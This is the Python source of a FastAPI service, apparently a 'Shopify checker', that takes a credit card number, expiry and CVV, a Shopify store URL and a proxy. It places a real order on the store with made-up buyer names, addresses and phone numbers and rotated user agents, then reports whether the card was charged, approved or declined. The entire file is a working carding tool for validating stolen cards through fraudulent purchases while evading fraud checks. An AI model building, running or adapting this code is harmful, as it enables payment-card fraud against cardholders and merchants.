
import asyncio
import random
import re
import json
from urllib.parse import urlparse
import time

import httpx
from fake_useragent import UserAgent
from fastapi import FastAPI, HTTPException, Query
from pydantic import BaseModel

# Developer Information
# Developer: Freska
# User: @zqzcz

app = FastAPI(
    title="Shopify Checkout API",
    description="API for performing Shopify checkout with proxy support."
)

def find_between(s, start, end):
    try:
        if start in s and end in s:
            return (s.split(start))[1].split(end)[0]
        return ""
    except:
        return ""

class ShopifyAuto:
    def __init__(self, proxy: str = None):
        self.user_agent = UserAgent().random
        self.last_price = None
        self.proxy = proxy
        self.start_time = time.time()

    async def get_httpx_client(self):
        proxies = None
        if self.proxy:
            try:
                parts = self.proxy.split(':')
                if len(parts) == 4:
                    ip, port, user, password = parts
                    proxies = {
                        "http://": f"http://{user}:{password}@{ip}:{port}",
                        "https://": f"http://{user}:{password}@{ip}:{port}",
                    }
                elif len(parts) == 2:
                    ip, port = parts
                    proxies = {
                        "http://": f"http://{ip}:{port}",
                        "https://": f"http://{ip}:{port}",
                    }
                else:
                    raise ValueError("Invalid proxy format. Expected ip:port or ip:port:user:pass")
            except Exception as e:
                print(f"Error parsing proxy: {e}")
                raise HTTPException(status_code=400, detail=f"Invalid proxy format: {e}")
        
        return httpx.AsyncClient(proxies=proxies, follow_redirects=True, timeout=30.0)

    async def get_random_info(self):
        """Get random user info with VALID addresses"""
        us_addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"}
        ]
        
        address = random.choice(us_addresses)
        first_name = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"])
        last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
        
        valid_phones = [
            "2025550199", "3105551234", "4155559876", "6175550123",
            "9718081573", "2125559999", "7735551212", "4085556789"
        ]
        phone = random.choice(valid_phones)
        
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }

    async def process_checkout(self, cc_full: str, site_url: str):
        response_status = "UNKNOWN"
        charged_status = False
        approved_status = False
        price = "N/A"
        gate = "Shopify Payments"

        try:
            cc, mon, year, cvv = cc_full.split('|')
        except ValueError:
            raise HTTPException(status_code=400, detail="Invalid CC format. Expected cc|mm|yy|cvv")

        async with await self.get_httpx_client() as session:
            try:
                shop = self
                
                product_header = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.6',
                    'user-agent': shop.user_agent,
                }

                product_response = await session.get(site_url + '/products.json', headers=product_header)
                product_response.raise_for_status()
                products_data = product_response.json()
                product = products_data['products'][0]
                product_id = product['id']
                product_handle = product['handle']
                variant_id = product['variants'][0]['id']
                price = product['variants'][0]['price']

                await session.get(f"{site_url}/products/{product_handle}", headers=product_header)
                product_header.update({'user-agent': UserAgent().random}) 
                await session.get(site_url + '/cart.js', headers=product_header)

                add_data = {
                    'id': str(variant_id),
                    'quantity': '1',
                    'form_type': 'product',
                }
                response = await session.post(site_url + '/cart/add.js', headers=product_header, data=add_data)
                response.raise_for_status()
                
                cart_response = await session.get(f"{site_url}/cart.js", headers=product_header)
                cart_response.raise_for_status()
                cart_data = cart_response.json()
                token = cart_data['token']
                
                checkout_headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': site_url,
                    'referer': f"{site_url}/cart",
                    'upgrade-insecure-requests': '1',
                    'user-agent': product_header['user-agent'],
                }
                
                await session.get(f"{site_url}/checkout", headers=checkout_headers) 
                
                checkout_data = {
                    'checkout': '',  
                    'updates[]': '1', 
                }
                
                checkout_response = await session.post(f"{site_url}/cart", headers=checkout_headers, data=checkout_data)
                checkout_response.raise_for_status()
                response_text2 = checkout_response.text

                x_checkout_one_session_token = re.search(
                    r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', 
                    response_text2
                )

                session_token = None
                if x_checkout_one_session_token:
                    session_token = x_checkout_one_session_token.group(1)

                queue_token = find_between(response_text2, 'queueToken&quot;:&quot;', '&quot;')
                stable_id = find_between(response_text2, 'stableId&quot;:&quot;', '&quot;')
                paymentMethodIdentifier = find_between(response_text2, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

                await asyncio.sleep(1)

                random_info = await shop.get_random_info()
                fname = random_info["fname"]
                lname = random_info["lname"]
                email = random_info["email"]
                phone = random_info["phone"]
                add1 = random_info["add1"]
                city = random_info["city"]
                state_short = random_info["state_short"]
                zip_code = str(random_info["zip"])

                session_endpoints = [
                    "https://deposit.us.shopifycs.com/sessions",
                    "https://checkout.pci.shopifyinc.com/sessions",
                    "https://checkout.shopifycs.com/sessions"
                ]
                        
                session_created = False
                sessionid = None
                        
                for endpoint in session_endpoints:
                    try:
                        headers = {
                            'authority': urlparse(endpoint).netloc,
                            'accept': 'application/json',
                            'content-type': 'application/json',
                            'origin': 'https://checkout.shopifycs.com',
                            'referer': 'https://checkout.shopifycs.com/',
                            'user-agent': shop.user_agent,
                        }

                        json_data = {  
                            'credit_card': {
                                'number': cc,
                                'month': mon,
                                'year': year,
                                'verification_value': cvv,
                                'name': fname + ' ' + lname,
                            },
                            'payment_session_scope': urlparse(site_url).netloc,
                        }

                        session_response = await session.post(endpoint, headers=headers, json=json_data)
                        if session_response.status_code == 200:
                            session_data = session_response.json()
                            if "id" in session_data:
                                sessionid = session_data["id"]
                                session_created = True
                                break
                    except Exception as e:
                        print(f"Error trying payment session endpoint {endpoint}: {e}")

                if not session_created:
                    response_status = "CARD_DECLINED"
                    approved_status = False
                    charged_status = False
                    raise HTTPException(status_code=500, detail="Failed to create payment session.")

                await asyncio.sleep(1)
                
                graphql_url = f"{site_url}/checkouts/unstable/graphql"
                
                tokens = {
                    'x_checkout_one_session_token': session_token,
                    'queue_token': queue_token,
                    'stable_id': stable_id,
                    'paymentMethodIdentifier': paymentMethodIdentifier
                }

                for attempt in range(2):
                    graphql_headers = {
                        'authority': urlparse(site_url).netloc,
                        'accept': 'application/json',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': 'application/json',
                        'origin': site_url,
                        'referer': f"{site_url}/",
                        'user-agent': shop.user_agent,
                        'x-checkout-one-session-token': session_token,
                        'x-checkout-web-deploy-stage': 'production',
                        'x-checkout-web-server-handling': 'fast',
                        'x-checkout-web-source-id': token,
                    }

                    random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"

                    graphql_payload = {
                        'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}\\n',
                        'variables': {
                            'input': {
                                'checkpointData': None,
                                'sessionInput': {
                                    'sessionToken': session_token,
                                },
                                'queueToken': queue_token,
                                'discounts': {
                                    'lines': [],
                                    'acceptUnexpectedDiscounts': True,
                                },
                                'delivery': {
                                    'deliveryLines': [
                                        {
                                            'selectedDeliveryStrategy': {
                                                'deliveryStrategyMatchingConditions': {
                                                    'estimatedTimeInTransit': {'any': True},
                                                    'shipments': {'any': True},
                                                },
                                                'options': {},
                                            },
                                            'targetMerchandiseLines': {
                                                'lines': [{'stableId': stable_id}],
                                            },
                                            'destination': {
                                                'streetAddress': {
                                                    'address1': add1,
                                                    'address2': '',
                                                    'city': city,
                                                    'countryCode': 'US',
                                                    'postalCode': zip_code,
                                                    'company': '',
                                                    'firstName': fname,
                                                    'lastName': lname,
                                                    'zoneCode': state_short,
                                                    'phone': phone,
                                                },
                                            },
                                            'deliveryMethodTypes': ['SHIPPING'],
                                            'expectedTotalPrice': {'any': True},
                                            'destinationChanged': True,
                                        },
                                    ],
                                    'noDeliveryRequired': [],
                                    'useProgressiveRates': False,
                                    'prefetchShippingRatesStrategy': None,
                                },
                                'merchandise': {
                                    'merchandiseLines': [
                                        {
                                            'stableId': stable_id,
                                            'merchandise': {
                                                'productVariantReference': {
                                                    'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                                    'properties': [],
                                                    'sellingPlanId': None,
                                                    'sellingPlanDigest': None,
                                                },
                                            },
                                            'quantity': {'items': {'value': 1}},
                                            'expectedTotalPrice': {'any': True},
                                            'lineComponentsSource': None,
                                            'lineComponents': [],
                                        },
                                    ],
                                },
                                'payment': {
                                    'totalAmount': {'any': True},
                                    'paymentLines': [
                                        {
                                            'paymentMethod': {
                                                'directPaymentMethod': {
                                                    'paymentMethodIdentifier': paymentMethodIdentifier,
                                                    'sessionId': sessionid,
                                                    'billingAddress': {
                                                        'streetAddress': {
                                                            'address1': add1,
                                                            'address2': '',
                                                            'city': city,
                                                            'countryCode': 'US',
                                                            'postalCode': zip_code,
                                                            'company': '',
                                                            'firstName': fname,
                                                            'lastName': lname,
                                                            'zoneCode': state_short,
                                                            'phone': phone,
                                                        },
                                                    },
                                                    'cardSource': None,
                                                },
                                            },
                                            'amount': {'any': True},
                                            'dueAt': None,
                                        },
                                    ],
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': add1,
                                            'address2': '',
                                            'city': city,
                                            'countryCode': 'US',
                                            'postalCode': zip_code,
                                            'company': '',
                                            'firstName': fname,
                                            'lastName': lname,
                                            'zoneCode': state_short,
                                            'phone': phone,
                                        },
                                    },
                                },
                                'buyerIdentity': {
                                    'buyerIdentity': {
                                        'presentmentCurrency': 'USD',
                                        'countryCode': 'US',
                                    },
                                    'contactInfoV2': {
                                        'emailOrSms': {
                                            'value': email,
                                            'emailOrSmsChanged': False,
                                        },
                                    },
                                    'marketingConsent': [{'email': {'value': email}}],
                                    'shopPayOptInPhone': {'countryCode': 'US'},
                                },
                                'tip': {'tipLines': []},
                                'taxes': {
                                    'proposedAllocations': None,
                                    'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                                    'proposedTotalIncludedAmount': None,
                                    'proposedMixedStateTotalAmount': None,
                                    'proposedExemptions': [],
                                },
                                'note': {'message': None, 'customAttributes': []},
                                'localizationExtension': {'fields': []},
                                'nonNegotiableTerms': None,
                                'scriptFingerprint': {
                                    'signature': None,
                                    'signatureUuid': None,
                                    'lineItemScriptChanges': [],
                                    'paymentScriptChanges': [],
                                    'shippingScriptChanges': [],
                                },
                                'optionalDuties': {'buyerRefusesDuties': False},
                            },
                            'attemptToken': f'{token}-{random.random()}',
                            'metafields': [],
                            'analytics': {
                                'requestUrl': f'{site_url}/checkouts/cn/{token}',
                                'pageId': random_page_id,
                            },
                        },
                        'operationName': 'SubmitForCompletion',
                    }

                    graphql_response = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                    graphql_response.raise_for_status()
                    
                    if graphql_response.status_code == 200:
                        result_data = graphql_response.json()
                        
                        receipt_id = None
                        error_codes = []
                        
                        completion = result_data.get('data', {}).get('submitForCompletion', {})
                        
                        if completion.get('receipt'):
                            receipt_id = completion['receipt'].get('id')
                        
                        if completion.get('__typename') == 'Throttled':
                            response_status = "THROTTLED"
                            approved_status = False
                            charged_status = False
                            break
                        
                        if completion.get('errors'):
                            errors = completion['errors']
                            error_codes = [e.get('code') for e in errors if 'code' in e]
                            
                            soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS']
                            only_soft_errors = all(code in soft_errors for code in error_codes)
                            if only_soft_errors and attempt == 0:
                                await asyncio.sleep(2)
                                continue
                            
                            non_soft_errors = [code for code in error_codes if code not in soft_errors]
                            if non_soft_errors:
                                response_status = "CARD_DECLINED"
                                approved_status = False
                                charged_status = False
                                break
                        
                        if completion.get('reason'):
                            response_status = "CARD_DECLINED"
                            approved_status = False
                            charged_status = False
                            break
                        
                        if receipt_id:
                            for poll_attempt in range(10):
                                await asyncio.sleep(3)
                                poll_payload = {
                                    'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}\\n',
                                    'variables': {
                                        'receiptId': receipt_id,
                                        'sessionToken': session_token,
                                    },
                                    'operationName': 'PollForReceipt'
                                }
                                
                                poll_response = await session.post(graphql_url, headers=graphql_headers, json=poll_payload)
                                poll_response.raise_for_status()
                                if poll_response.status_code == 200:
                                    poll_data = poll_response.json()
                                    receipt = poll_data.get('data', {}).get('receipt', {})
                                    
                                    if receipt.get('__typename') == 'ProcessedReceipt' or 'orderIdentity' in receipt:
                                        response_status = "CARD_CHARGED"
                                        charged_status = True
                                        approved_status = True
                                        break
                                    elif receipt.get('__typename') == 'ActionRequiredReceipt':
                                        response_status = "CARD_APPROVED_3DS"
                                        approved_status = True
                                        charged_status = False
                                        break
                                    elif receipt.get('__typename') == 'FailedReceipt':
                                        response_status = "CARD_DECLINED"
                                        approved_status = False
                                        charged_status = False
                                        break
                            break
                    else:
                        if attempt == 0:
                            await asyncio.sleep(2)
                            continue
                        response_status = "GRAPHQL_SUBMISSION_FAILED"
                        approved_status = False
                        charged_status = False
                        break

                checkout_url_final = f"{site_url}/checkout?from_processing_page=1&validate=true"
                final_response = await session.get(checkout_url_final)
                final_url = str(final_response.url)
                
                if "/thank" in final_url.lower() or "/orders/" in final_url:
                    response_status = "CARD_CHARGED"
                    charged_status = True
                    approved_status = True
                elif response_status == "UNKNOWN": # If no specific status was set yet
                    response_status = "UNKNOWN_STATUS_MANUAL_CHECK"
                    approved_status = False
                    charged_status = False

            except httpx.HTTPStatusError as e:
                response_status = f"HTTP_ERROR: {e.response.status_code}"
                approved_status = False
                charged_status = False
                print(f"HTTP error during checkout: {e}")
            except httpx.RequestError as e:
                response_status = f"REQUEST_ERROR: {e}"
                approved_status = False
                charged_status = False
                print(f"Request error during checkout: {e}")
            except Exception as e:
                response_status = f"INTERNAL_ERROR: {e}"
                approved_status = False
                charged_status = False
                print(f"An unexpected error occurred: {e}")

        elapsed_time = f"{time.time() - self.start_time:.2f}s"
        return {
            "Response": response_status,
            "CC": cc_full,
            "Price": price,
            "Gate": gate,
            "Site": site_url,
            "Charged": str(charged_status),
            "Approved": str(approved_status),
            "Time": elapsed_time
        }

@app.get("/check")
async def check_shopify(
    cc: str = Query(None, description="Credit Card in format cc|mm|yy|cvv"),
    site: str = Query(None, description="Shopify site URL, e.g., https://example.myshopify.com"),
    proxy: str = Query(None, description="Proxy in format ip:port or ip:port:user:pass")
):
    if not cc or not site or not proxy:
        return {"status": "error", "message": "لازم موقع وبروكسي وكود البطاقة لفحص العملية"}

    shopify_checker = ShopifyAuto(proxy=proxy)
    result = await shopify_checker.process_checkout(cc_full=cc, site_url=site)
    return result

